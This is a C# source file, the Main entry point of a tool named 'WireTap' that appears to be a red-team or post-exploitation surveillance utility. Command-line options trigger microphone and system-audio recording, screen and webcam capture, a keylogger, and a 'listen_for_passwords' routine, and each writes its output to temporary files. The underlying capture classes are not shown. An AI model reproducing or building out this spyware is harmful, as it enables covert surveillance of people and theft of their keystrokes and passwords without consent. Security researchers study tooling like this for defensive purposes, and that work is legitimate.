using System;

namespace WireTap
{
    class Program
    {
        static void Main(string[] args)
        {
            int recordTime = 10000;
            bool recordMic = false;
            bool recordSys = false;
            bool recordAudio = false;
            bool captureScreen = false;
            bool captureWebCam = false;
            bool captureKeyStrokes = false;
            bool listenPassword = false;

            if (args.Length == 0 || args.Length > 2)
            {
                Helpers.Usage();
                Environment.Exit(1);
            }
            switch (args[0])
            {
                case "record_mic":
                    recordMic = true;
                    break;
                case "record_sys":
                    recordSys = true;
                    break;
                case "record_audio":
                    recordAudio = true;
                    break;
                case "capture_screen":
                    captureScreen = true;
                    break;
                case "capture_webcam":
                    captureWebCam = true;
                    break;
                case "capture_keystrokes":
                    captureKeyStrokes = true;
                    break;
                case "listen_for_passwords":
                    listenPassword = true;
                    break;
                default:
                    Helpers.Usage();
                    Environment.Exit(1);
                    break;
            }

            // parsing here
            if (recordMic)
            {
                if (args.Length == 2)
                {
                    recordTime = Helpers.ParseTimerString(args[1]);
                }
                string tempFile = Helpers.CreateTempFileName(".wav");
                Audio.RecordMicrophone(tempFile, recordTime);
                Console.WriteLine("[+] Microphone recording located at: {0}", tempFile);
            }
            else if (recordSys)
            {
                if (args.Length == 2)
                {
                    recordTime = Helpers.ParseTimerString(args[1]);
                }
                string tempFile = Helpers.CreateTempFileName(".wav");
                Audio.RecordSystemAudio(tempFile, recordTime);
                Console.WriteLine("[+] Speaker recording file located at: {0}", tempFile);
            }
            else if (recordAudio)
            {
                if (args.Length == 2)
                {
                    recordTime = Helpers.ParseTimerString(args[1]);
                }
                string tempFile = Helpers.CreateTempFileName(".wav");
                Audio.RecordAudio(tempFile, recordTime);
                Console.WriteLine("[+] Audio recording file located at: {0}", tempFile);
            }
            else if (captureWebCam)
            {
                string tempFile = Helpers.CreateTempFileName(".jpeg");
                WebCam.CaptureImage(tempFile);
            }
            else if (captureScreen)
            {
                string tempFile = Helpers.CreateTempFileName(".jpeg");
                Display.CaptureImage(tempFile);
                Console.WriteLine("[+] Screenshot captured at: {0}", tempFile);
            }
            else if (captureKeyStrokes)
            {
                Keyboard.StartKeylogger();
            }
            else if (listenPassword)
            {
                Audio.ListenForPasswords();
            }
        }
    }
}
